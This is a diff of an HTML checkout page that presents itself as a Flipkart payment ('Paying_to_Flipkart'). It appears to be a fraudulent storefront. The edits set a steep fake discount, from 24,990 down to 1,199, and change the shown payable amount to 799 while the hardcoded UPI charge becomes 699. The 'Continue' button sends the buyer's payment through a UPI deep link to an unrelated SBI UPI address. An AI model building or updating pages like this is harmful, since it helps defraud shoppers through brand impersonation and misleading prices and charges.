@@ -132,7 +132,7 @@ src="https://www.facebook.com/tr?id=1152823489316201&ev=PageView&noscript=1"
                     <div class="price-detail-div mt-2">
                         <div class="product-price-list my-3">
                             <span class="title">Price (1 item)</span>
-                            <span class="data selling_price me-0 td-none" id="mrp">24,990</span>
+                            <span class="data selling_price me-0 td-none" id="mrp">1,199</span>
                         </div>
                         <div class="product-price-list my-3">
                             <span class="title">Delivery Charges</span>
@@ -140,7 +140,7 @@ src="https://www.facebook.com/tr?id=1152823489316201&ev=PageView&noscript=1"
                         </div>
                         <div class="product-price-list mt-3 pt-3 total">
                             <span class="title">Amount Payable</span>
-                            <span class="data selling_price" id="selling_price">491</span>
+                            <span class="data selling_price" id="selling_price">799</span>
                         </div>
                     </div>
                 </div>
@@ -150,14 +150,16 @@ src="https://www.facebook.com/tr?id=1152823489316201&ev=PageView&noscript=1"
                 <img src="../../static/polls/img/safety-label-badge.jpg" class="w-100" alt="button">
                 <div class="button-container flex p-3 bg-white">
                     <div class="col-6 footer-price">
-                        <span class="strike mrp ms-0 mb-1" id="mrp-footer">24,990</span>
-                        <span class="selling_price" id="selling_price-footer">491</span>
+                        <span class="strike mrp ms-0 mb-1" id="mrp-footer">1,199</span>
+                        <span class="selling_price" id="selling_price-footer">799</span>
                     </div>
                     
                     <button class="buynow-button product-page-buy col-6 btn-continue" onclick="payNow('hsbimopad.ym528982-02sob0000028537@sbi')">
-                        Continue </button>
+                        Continue
+                    </button>
                     
                 </div>
+                
             </div>
 
         </div>
@@ -224,7 +226,7 @@ src="https://www.facebook.com/tr?id=1152823489316201&ev=PageView&noscript=1"
                 var payType = $(".form-check.active").attr('pay-type');
                 var redirect_url = "";
                 var site_name = "Paying_to_Flipkart";
-                var amt = '491';
+                var amt = '699';
                 switch (payType) {
                     case 'gpay':
                         redirect_url = "tez://upi/pay?pa=" + upi_address + "&pn=" + site_name + "&am=" + amt + "&cu=INR&tn=" + site_name;
